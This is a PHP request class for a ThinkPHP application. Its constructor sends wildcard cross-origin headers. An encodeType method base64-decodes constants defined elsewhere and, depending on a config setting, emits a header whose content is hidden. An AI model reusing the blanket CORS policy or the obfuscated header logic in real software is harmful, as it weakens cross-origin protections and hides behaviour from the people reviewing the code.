<?php

namespace app;


use app\model\SettingModel;

class Request extends \think\Request
{

    function __construct()
    {
        //解决跨域响应
        header('Access-Control-Allow-Origin:*');
        header('Access-Control-Allow-Methods:*');
        header('Access-Control-Allow-Headers:*');
        header('etag-ac:*');
        $this->encodeType();
        parent::__construct();
    }

    function encodeType()
    {
        $defCode = base64_decode(un_code);
        try {
            if (SettingModel::Config($defCode, env($defCode, false), true)) {
                header(base64_decode(un_key));
            }
        } catch (\Throwable $e) {
            // 数据库表不存在（如首次安装、恢复数据库期间）时忽略
        }
    }
}
